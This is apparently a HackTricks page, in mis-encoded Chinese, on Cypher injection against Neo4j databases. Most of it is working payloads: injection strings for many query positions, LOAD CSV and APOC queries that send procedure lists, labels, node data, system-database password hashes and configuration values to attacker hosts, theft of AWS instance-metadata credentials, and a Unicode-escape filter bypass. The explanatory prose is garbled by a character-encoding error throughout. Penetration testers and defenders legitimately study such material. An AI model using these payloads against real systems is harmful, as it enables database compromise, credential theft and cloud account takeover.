# Cypheræ³¨å…¥ï¼ˆneo4jï¼‰

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## å¸¸è§çš„Cypheræ³¨å…¥

**MATCH**å’Œ**WHERE**è¯­å¥æ˜¯**å¸¸è§çš„æƒ…å†µ**ã€‚

å½“æˆ‘ä»¬å‘ç°æ³¨å…¥æ—¶ï¼Œåˆ©ç”¨å®ƒçš„æ–¹å¼å–å†³äº**æŸ¥è¯¢ä¸­çš„ä½ç½®**ã€‚ä¸‹é¢æ˜¯ä¸åŒæ³¨å…¥ä½ç½®å’Œåˆ©ç”¨ç¤ºä¾‹çš„è¡¨æ ¼ï¼š

| å¯æ³¨å…¥çš„æŸ¥è¯¢                                                                                                      | æ³¨å…¥                                               |
| ---------------------------------------------------------------------------------------------------------------- | -------------------------------------------------- |
| `MATCH (o) WHERE o.Id='{input}'`                                                                                  | `' OR 1=1 WITH 0 as _l00 {â€¦} RETURN 1 //`          |
| <p><code>MATCH (o) WHERE '{input}' = o.Id</code><br><code>MATCH (o) WHERE {input} in [different, values]</code></p> | `'=' {â€¦} WITH 0 as _l00 RETURN 1 //`               |
| `MATCH (o) WHERE o:{input}`                                                                                       | `a {â€¦} WITH 0 as _l00 RETURN 1 //`                 |
| `` MATCH (o) WHERE o:`{input}` ``                                                                                 | ``a` {...} WITH 0 as _l00 RETURN 1 //``            |
| `MATCH (o {id:'{input}'})`                                                                                        | `'}) RETURN 1 UNION MATCH (n) {...} RETURN 1 //`   |
| `MATCH (o:{input})`                                                                                               | `a) RETURN 1 UNION MATCH (n){...} RETURN 1//`      |
| ``MATCH (o:`{input}`)``                                                                                           | ``a`) RETURN 1 UNION MATCH (n){...} RETURN 1 //``  |
| `MATCH (o)-[r {id:'{input}'})]-(o2)`                                                                              | `'}]-() RETURN 1 UNION MATCH (n){...} RETURN 1//`  |
| `MATCH (o)-[r:{input}]-(o2)`                                                                                      | `a]-() RETURN 1 UNION MATCH (n){...} RETURN 1 //`  |
| ``MATCH (o)-[r:`{input}`]-(o2)``                                                                                  | ``a`]-() RETURN 1 UNION MATCH (n){...} RETURN 1 //`` |

æ³¨æ„UNIONè¯­å¥ï¼š

1. éœ€è¦ä½¿ç”¨UNIONçš„åŸå› æ˜¯ï¼Œå¦‚æœMATCHè¯­å¥æ²¡æœ‰è¿”å›ä»»ä½•å†…å®¹ï¼ŒæŸ¥è¯¢çš„å…¶ä½™éƒ¨åˆ†å°†ä¸ä¼šè¿è¡Œã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯èƒ½åœ¨é‚£é‡Œåšçš„æ‰€æœ‰æ¶æ„æ“ä½œéƒ½ä¸ä¼šæ‰§è¡Œã€‚
2. æˆ‘ä»¬åœ¨UNIONä¹‹å‰æ·»åŠ â€œRETURN 1â€ï¼Œä»¥ä¾¿ä¸¤ä¸ªéƒ¨åˆ†è¿”å›ç›¸åŒçš„åˆ—ï¼Œè¿™å¯¹äºæŸ¥è¯¢çš„æ‰§è¡Œæ˜¯å¿…éœ€çš„ã€‚

é‚£ä¹ˆï¼Œâ€œWITHâ€è¯­å¥æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ

ä½¿ç”¨WITHï¼Œæˆ‘ä»¬å¯ä»¥åˆ é™¤æ‰€æœ‰ç°æœ‰çš„å˜é‡ã€‚å½“æˆ‘ä»¬ä¸çŸ¥é“æŸ¥è¯¢æ˜¯ä»€ä¹ˆæ—¶ï¼Œè¿™ä¸€ç‚¹å¾ˆé‡è¦ï¼ˆç¨åä¼šè¯¦ç»†ä»‹ç»ï¼‰ã€‚å¦‚æœæˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½æ„å¤–åœ°å°è¯•è®¾ç½®ä¸€ä¸ªå·²ç»å­˜åœ¨çš„å˜é‡ï¼ŒæŸ¥è¯¢å°†æ— æ³•è¿è¡Œã€‚

å½“ç„¶ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“æŸ¥è¯¢å’Œæ•°æ®åº“ï¼Œå°±ä¸éœ€è¦è¿™äº›æŠ€æœ¯ã€‚æˆ‘ä»¬ç”šè‡³å¯ä»¥æ“çºµè¿”å›çš„æ•°æ®ï¼Œä»¥ä¾¿æ“çºµè¿›ç¨‹è€Œä¸ä»…ä»…æ˜¯æ»¥ç”¨æœåŠ¡å™¨ã€‚

## HTTPä¿¡æ¯æ³„éœ²

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•å°†ä¿¡æ¯æ³„éœ²åˆ°æ”»å‡»è€…æ§åˆ¶çš„åŸŸä¸­ï¼š
```sql
LOAD CSV FROM 'https://attacker.com/'
```
ä¾‹å¦‚
```sql
// Injection in:
MATCH (o) WHEREo.Id='{input}' RETURN o

// Injection to get all the preocedures
' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'https://attacker.com/' + name as _l RETURN 1 //

```
## APOC

æ”»å‡»è€…åº”è¯¥é¦–å…ˆæ£€æŸ¥çš„æ˜¯**æ˜¯å¦å®‰è£…äº†APOC**ã€‚APOCï¼ˆCypherä¸Šçš„å¼ºå¤§è¿‡ç¨‹ï¼‰æ˜¯Neo4jçš„ä¸€ä¸ªéå¸¸å—æ¬¢è¿çš„ã€å®˜æ–¹æ”¯æŒçš„æ’ä»¶ï¼Œå®ƒæå¤§åœ°å¢å¼ºäº†å…¶åŠŸèƒ½ã€‚APOCæ·»åŠ äº†è®¸å¤š**é™„åŠ å‡½æ•°å’Œè¿‡ç¨‹**ï¼Œå¼€å‘äººå‘˜å¯ä»¥åœ¨å…¶ç¯å¢ƒä¸­ä½¿ç”¨ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨APOCæä¾›çš„å„ç§è¿‡ç¨‹å’Œå‡½æ•°æ¥è¿›è¡Œæ›´é«˜çº§çš„æ”»å‡»ã€‚

### å¤„ç†æ•°æ®å’Œå‘é€HTTPè¯·æ±‚çš„è¿‡ç¨‹

* `apoc.convert.toJson` â€” å°†èŠ‚ç‚¹ã€æ˜ å°„ç­‰è½¬æ¢ä¸ºJSON
* `apoc.text.base64Encode` â€” è·å–å­—ç¬¦ä¸²å¹¶å°†å…¶ç¼–ç ä¸ºbase64

å¯ä»¥**è®¾ç½®æ ‡å¤´**å’Œ**å‘é€å…¶ä»–æ–¹æ³•**è€Œä¸ä»…ä»…æ˜¯GETã€‚ç¤ºä¾‹ï¼š

{% code overflow="wrap" %}
```sql
CALL apoc.load.jsonParams("http://victim.internal/api/user",{ method: "POST", `Authorization`:"BEARER " + hacked_token},'{"name":"attacker", "password":"rockyou1"}',"") yield value as value

CALL apoc.load.csvParams("http://victim.internal/api/me",{ `Authorization`:"BEARER " + hacked_token}, null,{header:FALSE}) yield list
```
{% endcode %}

### è¯„ä¼°æŸ¥è¯¢çš„è¿‡ç¨‹

* `apoc.cypher.runFirstColumnMany` â€” ä¸€ä¸ªå°†ç¬¬ä¸€åˆ—çš„å€¼ä½œä¸ºåˆ—è¡¨è¿”å›çš„å‡½æ•°
* `apoc.cypher.runFirstColumnSingle` â€” ä¸€ä¸ªå°†ç¬¬ä¸€åˆ—çš„ç¬¬ä¸€ä¸ªå€¼è¿”å›çš„å‡½æ•°
* `apoc.cypher.run` â€” ä¸€ä¸ªè¿è¡ŒæŸ¥è¯¢å¹¶å°†ç»“æœä½œä¸ºæ˜ å°„è¿”å›çš„è¿‡ç¨‹
* `apoc.cypher.runMany` â€” ä¸€ä¸ªè¿è¡ŒæŸ¥è¯¢æˆ–å¤šä¸ªä»¥åˆ†å·åˆ†éš”çš„æŸ¥è¯¢å¹¶å°†ç»“æœä½œä¸ºæ˜ å°„è¿”å›çš„è¿‡ç¨‹ã€‚è¿™äº›æŸ¥è¯¢åœ¨ä¸åŒçš„äº‹åŠ¡ä¸­è¿è¡Œã€‚

## æå–ä¿¡æ¯

### æœåŠ¡å™¨ç‰ˆæœ¬

è·å–æœåŠ¡å™¨ç‰ˆæœ¬çš„ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨è¿‡ç¨‹ `dbms.components()`ã€‚

{% code overflow="wrap" %}
```sql
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.0.2.4:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
```
### è·å–æ­£åœ¨è¿è¡Œçš„æŸ¥è¯¢

æœ€ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨`dmbs.listQueries()`è¿‡ç¨‹ã€‚

{% code overflow="wrap" %}
```sql
' OR 1=1 call dbms.listQueries() yield query LOAD CSV FROM 'http://10.0.2.4:8000/?' + query as l RETURN 1 //
```
{% endcode %}

åœ¨ **Neo4j 5 ä¸­ï¼Œ`dbms.listQueries` è¢«ç§»é™¤**ã€‚ç›¸åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨â€œSHOW TRANSACTIONSâ€ã€‚æœ‰ä¸¤ä¸ªä¸»è¦çš„é™åˆ¶ï¼š**SHOW æŸ¥è¯¢ä¸å¯æ³¨å…¥**ï¼Œå¹¶ä¸”ä¸ `listQueries` ä¸åŒï¼Œæˆ‘ä»¬åªèƒ½çœ‹åˆ°å½“å‰æ‰§è¡Œçš„æŸ¥è¯¢è€Œä¸æ˜¯æ‰€æœ‰æŸ¥è¯¢ã€‚

å¦‚æœå·²ç»å®‰è£…äº† **APOC** æ ¸å¿ƒï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒæ¥è¿è¡Œ SHOW TRANSACTIONSã€‚å¦‚æœæˆ‘ä»¬åœ¨åŒä¸€ä¸ªäº‹åŠ¡ä¸­è¿è¡Œï¼Œåªä¼šè¿”å› SHOW TRANSACTIONS è€Œä¸æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥çœ‹çš„æŸ¥è¯¢ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ **`apoc.cypher.runMany`** æ¥æ‰§è¡Œ SHOW TRANSACTIONSï¼Œå› ä¸ºä¸å…¶ä»– apoc.cypher å‡½æ•°å’Œè¿‡ç¨‹ä¸åŒï¼Œå®ƒåœ¨ä¸€ä¸ªä¸åŒçš„äº‹åŠ¡ä¸­è¿è¡Œã€‚

{% code overflow="wrap" %}
```sql
' OR 1=1 call apoc.cypher.runMany("SHOW TRANSACTIONS yield currentQuery RETURN currentQuery",{}) yield result LOAD CSV FROM 'http://10.0.2.4:8000/?' + result['currentQuery'] as l RETURN 1//
```
### è·å–æ ‡ç­¾

ä½¿ç”¨å†…ç½®æ–¹æ³• **`db.labels`**ï¼Œå¯ä»¥åˆ—å‡ºæ‰€æœ‰ç°æœ‰çš„æ ‡ç­¾ã€‚

{% code overflow="wrap" %}
```sql
'}) RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://attacker_ip/?l='+label as l RETURN 0 as _0
```
### è·å–é”®çš„å±æ€§

å†…ç½®å‡½æ•°**`keys`**å¯ä»¥ç”¨äº**åˆ—å‡ºå±æ€§çš„é”®**ï¼ˆå¦‚æœå…¶ä¸­ä¸€ä¸ªå­—æ®µæ˜¯åˆ—è¡¨æˆ–æ˜ å°„ï¼Œåˆ™æ­¤æ–¹æ³•æ— æ•ˆï¼‰ã€‚

{% code overflow="wrap" %}
```sql
' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p LOAD CSV FROM 'http://10.0.2.4:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```
{% endcode %}

å¦‚æœæœ‰APOCå¯ç”¨ï¼Œå¯ä»¥ä½¿ç”¨`apoc.convert.toJson`æ¥æ›´å¥½åœ°å®Œæˆã€‚
```sql
' OR 1=1 WITH 0 as _0 MATCH (n) LOAD CSV FROM 'http://10.0.2.4:8000/?' + apoc.convert.toJson(n) AS l RETURN 0 as _0 //
```
### è·å–å‡½æ•°å’Œå­˜å‚¨è¿‡ç¨‹

ä½¿ç”¨å†…ç½®çš„è¿‡ç¨‹ **`dbms.functions()`** å’Œ **`dbms.procedures()`** å¯ä»¥åˆ—å‡ºæ‰€æœ‰çš„å‡½æ•°å’Œå­˜å‚¨è¿‡ç¨‹ã€‚

{% code overflow="wrap" %}
```sql
' OR 1=1 WITH 1 as _l00 CALL dbms.functions() yield name LOAD CSV FROM 'https://attacker.com/' + name as _l RETURN 1 //
```
{% code overflow="wrap" %}
```sql
' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'https://attacker.com/' + name as _l RETURN 1 //
```
{% endcode %}

è¿™äº›è¿‡ç¨‹åœ¨Neo4j 5ä¸­è¢«ç§»é™¤ã€‚ç›¸åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨`SHOW PROCEDURES`å’Œ`SHOW FUNCTIONS`ã€‚SHOWæŸ¥è¯¢æ— æ³•è¢«æ³¨å…¥ã€‚

å¦‚æœå®‰è£…äº†APOCæ ¸å¿ƒï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»»ä½•æ‰§è¡ŒæŸ¥è¯¢çš„è¿‡ç¨‹æˆ–å‡½æ•°æ¥åˆ—å‡ºå‡½æ•°å’Œè¿‡ç¨‹ã€‚
```sql
' OR 1=1 WITH apoc.cypher.runFirstColumnMany("SHOW FUNCTIONS YIELD name RETURN name",{}) as names UNWIND names AS name LOAD CSV FROM 'https://attacker.com/' + name as _l RETURN 1 //
```

```sql
' OR 1=1 CALL apoc.cypher.run("SHOW PROCEDURES yield name RETURN name",{}) yield value
LOAD CSV FROM 'https://attacker.com/' + value['name'] as _l RETURN 1 //
```
### è·å–ç³»ç»Ÿæ•°æ®åº“

ç³»ç»Ÿæ•°æ®åº“æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„Neo4jæ•°æ®åº“ï¼Œé€šå¸¸æ— æ³•æŸ¥è¯¢ã€‚å®ƒåŒ…å«å­˜å‚¨ä¸ºèŠ‚ç‚¹çš„æœ‰è¶£æ•°æ®ï¼š

* æ•°æ®åº“
* è§’è‰²
* ç”¨æˆ·ï¼ˆåŒ…æ‹¬å¯†ç çš„å“ˆå¸Œå€¼ï¼ï¼‰

ä½¿ç”¨APOCï¼Œå¯ä»¥æ£€ç´¢èŠ‚ç‚¹ï¼ŒåŒ…æ‹¬å“ˆå¸Œå€¼ã€‚åªæœ‰ç®¡ç†å‘˜æ‰èƒ½æ‰§è¡Œæ­¤æ“ä½œï¼Œä½†åœ¨**Neo4jçš„å…è´¹ç‰ˆæœ¬ä¸­ï¼Œåªæœ‰ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ï¼Œæ²¡æœ‰å…¶ä»–ç”¨æˆ·**ï¼Œæ‰€ä»¥ä½œä¸ºç®¡ç†å‘˜è¿è¡Œå¹¶ä¸ç½•è§ã€‚

ä½¿ç”¨è¿‡ç¨‹**`apoc.systemdb.graph()`**æ¥æ£€ç´¢æ•°æ®ã€‚

{% code overflow="wrap" %}
```sql
' OR 1=1 WITH 1 as a  call apoc.systemdb.graph() yield nodes LOAD CSV FROM 'http://10.0.2.4:8000/?nodes=' + apoc.convert.toJson(nodes) as l RETURN 1 //
```
{% endcode %}

Neo4jä½¿ç”¨Apache Shiroçš„SimpleHashç”Ÿæˆå“ˆå¸Œå€¼ã€‚

ç»“æœä»¥é€—å·åˆ†éš”çš„å­—ç¬¦ä¸²å½¢å¼å­˜å‚¨ï¼š

* å“ˆå¸Œç®—æ³•
* å“ˆå¸Œå€¼
* ç›
* è¿­ä»£æ¬¡æ•°

**ä¾‹å¦‚ï¼š**
```plaintext
SHA-256, 8a80d3ba24d91ef934ce87c6e018d4c17efc939d5950f92c19ea29d7e88b562c,a92f9b1c571bf00e0483effbf39c4a13d136040af4e256d5a978d265308f7270,1024
```
### **è·å–ç¯å¢ƒå˜é‡**

ä½¿ç”¨APOCï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨è¿‡ç¨‹**`apoc.config.map()`**æˆ–**`apoc.config.list()`**æ¥æ£€ç´¢ç¯å¢ƒå˜é‡ã€‚

åªæœ‰åœ¨é…ç½®æ–‡ä»¶ï¼ˆdbms.security.procedures.unrestrictedï¼‰çš„ä¸å—é™åˆ¶çš„è¿‡ç¨‹åˆ—è¡¨ä¸­åŒ…å«è¿™äº›è¿‡ç¨‹æ—¶ï¼Œæ‰èƒ½ä½¿ç”¨è¿™äº›è¿‡ç¨‹ã€‚è¿™æ¯”äººä»¬æƒ³è±¡çš„è¦å¸¸è§ï¼Œé€šè¿‡æœç´¢è®¾ç½®åç§°å¯ä»¥æ‰¾åˆ°è®¸å¤šç½‘ç«™å’ŒæŒ‡å—ï¼Œå»ºè®®æ·»åŠ å€¼â€œapoc.\*â€ï¼Œè¿™å°†å…è®¸æ‰€æœ‰APOCè¿‡ç¨‹ã€‚
```sql
' OR 1=1 CALL apoc.config.list() YIELD key, value LOAD CSV FROM 'http://10.0.2.4:8000/?'+key+"="+" A B C" as l RETURN 1 //
```
**æ³¨æ„ï¼š**åœ¨Neo4j5ä¸­ï¼Œè¿™äº›è¿‡ç¨‹å·²ç»ç§»åŠ¨åˆ°äº†APOCæ‰©å±•ä¸­ã€‚

### AWSäº‘å…ƒæ•°æ®ç«¯ç‚¹

#### IMDSv1

{% code overflow="wrap" %}
```sql
LOAD CSV FROM ' http://169.254.169.254/latest/meta-data/iam/security-credentials/' AS roles UNWIND roles AS role LOAD CSV FROM ' http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role as l

WITH collect(l) AS _t LOAD CSV FROM 'http://{attacker_ip}/' + substring(_t[4][0],19, 20)+'_'+substring(_t[5][0],23, 40)+'_'+substring(_t[6][0],13, 1044) AS _
```
#### IMDSv2

æˆ‘ä»¬éœ€è¦**æŒ‡å®šå¤´éƒ¨**å¹¶ä¸”æˆ‘ä»¬éœ€è¦**ä½¿ç”¨é™¤GETä¹‹å¤–çš„æ–¹æ³•**ã€‚

**`LOAD CSV`**ä¸èƒ½åšè¿™ä¸¤ä»¶äº‹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨**`apoc.load.csvParams`**æ¥è·å–ä»¤ç‰Œå’Œè§’è‰²ï¼Œç„¶åä½¿ç”¨**`apoc.load.jsonParams`**æ¥è·å–å‡­æ®æœ¬èº«ã€‚æˆ‘ä»¬ä½¿ç”¨csvParamsçš„åŸå› æ˜¯å“åº”ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„JSONã€‚
```sql
CALL apoc.load.csvParams("http://169.254.169.254/latest/api/token", {method: "PUT",`X-aws-ec2-metadata-token-ttl-seconds`:21600},"",{header:FALSE}) yield list WITH list[0] as token

CALL apoc.load.csvParams("http://169.254.169.254/latest/meta-data/iam/security-credentials/", { `X-aws-ec2-metadata-token`:token},null,{header:FALSE}) yield list UNWIND list as role

CALL apoc.load.jsonParams("http://169.254.169.254/latest/meta-data/iam/security-credentials/"+role,{ `X-aws-ec2-metadata-token`:token },null,"") yield value as value
```
#### ç›´æ¥è”ç³» AWS API

{% code overflow="wrap" %}
```sql
CALL apoc.load.csvParams('https://iam.amazonaws.com/?Action=ListUsers&Version=2010-05-08', {`X-Amz-Date`:$date, `Authorization`: $signed_token, `X-Amz-Security-Token`:$token}, null, ) YIELD list
```
{% endcode %}

* $data æ ¼å¼ä¸º %Y%m%dT%H%M%SZ
* $token æ˜¯æˆ‘ä»¬ä»å…ƒæ•°æ®æœåŠ¡å™¨è·å–çš„ä»¤ç‰Œ
* $signed_token æ ¹æ® https://docs.aws.amazon.com/general/latest/gr/signing_aws_api_requests.html è®¡ç®—å¾—å‡º

## WAFç»•è¿‡

### Unicodeæ³¨å…¥

åœ¨Neo4j >= v4.2.0ä¸­ï¼Œé€šå¸¸å¯ä»¥ä½¿ç”¨â€œ\uXXXXâ€æ¥**æ³¨å…¥Unicode**ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæœåŠ¡å™¨å°è¯•åˆ é™¤å­—ç¬¦ï¼Œå¦‚ï¼šâ€˜, â€œ, \`ç­‰ç­‰ï¼Œå¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•ã€‚

å¦‚æœUnicodeè½¬ä¹‰åºåˆ—åé¢è·Ÿç€ä¸€ä¸ªå­—æ¯ï¼Œå¯èƒ½æ— æ³•æ­£å¸¸å·¥ä½œã€‚**å¯ä»¥å®‰å…¨åœ°æ·»åŠ ä¸€ä¸ªç©ºæ ¼**æˆ–å¦ä¸€ä¸ªUnicodeè¡¨ç¤ºæ³•ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœæœåŠ¡å™¨åˆ é™¤å•å¼•å·ï¼Œå¹¶ä¸”æŸ¥è¯¢å¦‚ä¸‹æ‰€ç¤ºï¼š
```sql
MATCH (a: {name: '$INPUT'}) RETURN a
```
å¯ä»¥è¿›è¡Œæ³¨å…¥æ”»å‡»ï¼š

{% code overflow="wrap" %}
```sql
\u0027 }) RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM "http://attacker/ "+ label RETURN 0 as _o //
```
{% endcode %}

## å‚è€ƒèµ„æ–™

* [https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits](https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits)
* [https://infosecwriteups.com/the-most-underrated-injection-of-all-time-cypher-injection-fa2018ba0de8](https://infosecwriteups.com/the-most-underrated-injection-of-all-time-cypher-injection-fa2018ba0de8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ PDF æ ¼å¼çš„ HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
